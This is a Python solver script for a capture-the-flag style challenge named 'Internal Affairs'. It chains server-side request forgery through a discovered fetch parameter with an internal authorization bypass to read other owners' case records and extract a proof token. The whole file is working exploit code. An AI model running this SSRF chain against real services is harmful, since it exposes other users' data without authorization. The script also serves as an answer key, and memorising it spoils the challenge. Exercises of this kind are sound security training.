#!/usr/bin/env python3
"""Solve Internal Affairs: SSRF followed by internal object-authorization bypass.

All routes, the fetch parameter, the internal service URL, and the foreign case
identifier are derived from the live target. No Game Master access is performed.
"""
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Target:
    def __init__(self, base_url, evidence_dir):
        self.base = base_url.rstrip("/")
        self.evidence = Path(evidence_dir)
        self.evidence.mkdir(parents=True, exist_ok=True)
        self.count = 0
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    def get(self, path, name):
        if self.count:
            time.sleep(0.8)
        self.count += 1
        url = self.base + path
        request = urllib.request.Request(url, headers={"User-Agent": UA})
        try:
            with self.opener.open(request, timeout=30) as response:
                status = response.status
                headers = response.headers
                body = response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            status = error.code
            headers = error.headers
            body = error.read().decode("utf-8", "replace")
        (self.evidence / f"{name}.headers").write_text(
            f"HTTP {status}\n{str(headers)}")
        (self.evidence / f"{name}.body").write_text(body)
        return status, body


def get_json(target, path, name):
    status, body = target.get(path, name)
    try:
        return status, json.loads(body)
    except ValueError:
        return status, None


def solve(base_url, evidence_dir):
    target = Target(base_url, evidence_dir)
    status, clues = get_json(target, "/api/clues", "clues")
    if status != 200 or not isinstance(clues, dict):
        return None
    feature = clues.get("feature_route")
    topology_route = clues.get("topology_route")
    directory_route = clues.get("case_directory_route")
    role = clues.get("current_role")
    if not all((feature, topology_route, directory_route, role)):
        return None

    status, topology = get_json(target, topology_route, "topology")
    status_cases, directory = get_json(target, directory_route, "cases")
    status_feature, feature_hint = get_json(target, feature, "feature-schema")
    if (status != 200 or status_cases != 200 or not isinstance(topology, dict)
            or not isinstance(directory, dict)):
        return None
    service = topology.get("case_service")
    fetch_param = ((feature_hint or {}).get("query_parameter")
                   if status_feature == 400 else None) or "target"
    if not service:
        return None

    for case in directory.get("cases", []):
        if case.get("owner") == role or "id" not in case:
            continue
        parts = urllib.parse.urlsplit(service)
        query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        query.append(("id", str(case["id"])))
        internal_url = urllib.parse.urlunsplit(
            parts._replace(query=urllib.parse.urlencode(query)))
        outer_query = urllib.parse.urlencode({fetch_param: internal_url})
        status, body = target.get(f"{feature}?{outer_query}",
                                  f"foreign-case-{case['id']}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    return None


def main():
    if len(sys.argv) != 3:
        sys.exit(f"usage: {sys.argv[0]} <target-base-url> <evidence-directory>")
    proof = solve(sys.argv[1], sys.argv[2])
    if not proof:
        sys.exit("no proof recovered")
    print(proof)


if __name__ == "__main__":
    main()
